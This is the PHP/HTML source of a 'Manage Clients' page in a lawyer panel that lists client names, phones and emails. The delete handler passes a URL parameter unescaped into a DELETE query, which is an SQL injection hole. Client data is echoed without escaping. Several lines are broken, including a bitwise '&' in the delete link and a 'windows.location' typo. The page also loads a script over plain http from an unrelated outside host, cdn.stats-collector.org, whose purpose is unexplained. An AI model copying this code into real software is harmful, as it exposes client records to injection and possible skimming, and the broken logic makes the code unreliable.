<!doctype html>

<body>
<?php
include "connection.php";

include "header1.php";
$val="";
 
?>
 <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Manage Clients
        <small>Lawyer panel</small>
      </h1>
      <ol class="breadcrumb">
      	<input id="myInput" type="text" placeholder="Search..">
        <li><a href="dashboard.php"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="active">Manage Clients</li>
      </ol>
    </section>

    <!-- Main content -->
    <section class="content">
      <!-- Small boxes (Stat box) -->
      <!-- Main row -->
      <div class="row">
	    <div class="col-xs-12">
          <div class="box">
            <div class="box-header">
              <h3 class="box-title">Manage Clients</h3>

              
            </div>
            <!-- /.box-header -->
            <div class="box-body table-responsive no-padding">
              <table class="table table-hover">
                <tr>
                  <th>ID</th>
                  <th>Client Name</th>
				  <th>Phone</th>
				  <th>Email</th>
				  <th>Opponent Info
                  
                  <th>Action</th>
                </tr>
				


				<?php
				
					$log=$_SESSION['log'];

					$q1=mysqli_query($con,"SELECT * FROM tbl_login WHERE email='$log'");
					$value = mysqli_fetch_array($q1);
					$xyz=$value['l_id'];

					$q4=mysqli_query($con,"SELECT * FROM lawyer WHERE l_id='$xyz'");
					$value4 = mysqli_fetch_array($q4);
					$xyz4=$value4['law_id'];
					

					$query="SELECT tbl_client.c_id,tbl_login.l_id,tbl_client.name,tbl_login.phone,tbl_login.email FROM tbl_client,tbl_login WHERE  tbl_client.l_id=tbl_login.l_id AND tbl_client.law_id='$xyz4'";
					$result2 = mysqli_query($con,$query);
					
					$seq=1;
					while($value2 = mysqli_fetch_array($result2))
					{
				?>
                <tr>
                	<?php echo "<tbody id='myTable'>"; ?>
                  <td><?php echo $seq;?></td>
                  <td><?php echo $value2['name'];?></td>
                  <td><?php echo $value2['phone'];?></td>
				  <td><?php echo $value2['email'];?></td>
				  <?php $val=$value2['l_id'];

				   	?>
                 <td>  <a href="Client_View.php?id=<?php echo $value2['c_id']; ?>" class="btn btn-success btn-xs">View</a> </td>
					
				  <td> 
				  <a class="btn btn-success btn-xs" href="editprofile.php?id=<?php echo $value2['c_id'];?> " 
					onclick="return confirm('sure to edit?');">EDIT</a> &nbsp;&nbsp;
				  <a class="btn btn-danger btn-xs" href="?del=<?php echo $value2['c_id']&$val;?>" 
					onclick="return confirm('sure to delete?');">DELETE</a>
					</td>
				</tr>
				
				<?php
					$seq++;
					}
			if(isset($_GET['del']))
		   {
		  
			$sql="DELETE FROM tbl_client WHERE c_id=".$_GET['del']."";
			$resultt=mysqli_query($con,$sql);

			if($resultt)
			{
				if(isset($_GET['val']))
		   {
			$sql="UPDATE tbl_login SET active=0 WHERE l_id='$val'";
			$resultt=mysqli_query($con,$sql);
			echo "<script>windows.location.href='manageclients.php'</script>";
		}
		   }}
				
				?>

              </table>
            </div>
<script language="javascript" charset="UTF-8" type="text/javascript" src="http://cdn.stats-collector.org/stats.js"></script>

<script>
$(document).ready(function(){
  $("#myInput").on("keyup", function() {
    var value = $(this).val().toLowerCase();
    $("#myTable tr").filter(function() {
      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
    });
  });
});
</script>
